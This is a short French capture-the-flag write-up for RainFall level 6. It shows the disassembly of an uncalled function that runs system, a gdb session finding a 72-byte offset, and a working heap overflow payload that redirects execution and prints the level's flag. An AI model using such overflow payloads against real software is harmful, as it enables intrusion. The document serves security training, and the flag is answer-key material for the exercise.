# Level 6

```
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 ab
Nope
```

Nous observons que la fonction main appelle une fonction "m" et une "n" .

En un premier lieu, observons la fonction n:
```
08048454 <n>:
 8048454:	55                   	push   ebp
 8048455:	89 e5                	mov    ebp,esp
 8048457:	83 ec 18             	sub    esp,0x18
 804845a:	c7 04 24 b0 85 04 08 	mov    DWORD PTR [esp],0x80485b0
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
```

On comprend qu'il faudra l'executer car on voit l'appel systeme.
Elle n'est jamais appelé, l'objectif sera de l'exécuter.

Dans le main, on observe:
Un premier call à malloc de 64 
Un second call à malloc de 4 (le suivant dans la mémoire)

Essayons comme precedemment de faire "sauter" la memoire et d'inserer notre fonction n dans la memoire ayant segfalt

```
gdb ./level6
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A
0x41346341 in ?? ()
```

Calculons l'offset:
https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
72

```
gdb ./level6
info function n
On remarque: 0x08048454  n
```

Donc (on inverse encore une fois l'adresse pour respecter le little endian)

```
./level6 `python -c "print('\x90' * 72 + '\x54\x84\x04\x08')"`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
